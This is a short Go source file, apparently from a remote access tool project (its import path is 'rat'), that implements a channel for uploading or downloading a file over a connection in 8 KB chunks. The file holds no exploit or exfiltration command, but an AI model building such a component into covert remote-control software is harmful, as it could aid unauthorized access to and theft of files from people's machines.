package main

import (
	"encoding/binary"
	"fmt"
	"io"
	"rat/shared"
	"rat/shared/network/header"
)

type ChannelTransfer struct {
	Transfer *Transfer
}

func (ChannelTransfer) Header() header.PacketHeader {
	return header.ChannelTransferHeader
}

func (ch ChannelTransfer) Open(r io.ReadWriteCloser, c *Client) error {
	defer r.Close()

	err := ch.Transfer.Open(ch.Transfer.Download)

	if err != nil {
		panic(err)
	}

	binary.Write(r, binary.LittleEndian, ch.Transfer.Download)
	binary.Write(r, binary.LittleEndian, ch.Transfer.Offset)
	shared.WriteString(r, ch.Transfer.Remote)

	if ch.Transfer.Download {
		b := make([]byte, 1024<<3)
		for err == nil {
			var n int
			n, err = r.Read(b)
			ch.Transfer.Write(b[:n])
			fmt.Println(err)
		}
	} else {
		b := make([]byte, 1024<<3)
		for err == nil {
			var n int
			n, err = ch.Transfer.Read(b)

			if err == nil {
				r.Write(b[:n])
			}
		}
	}

	ch.Transfer.Close()

	return nil
}
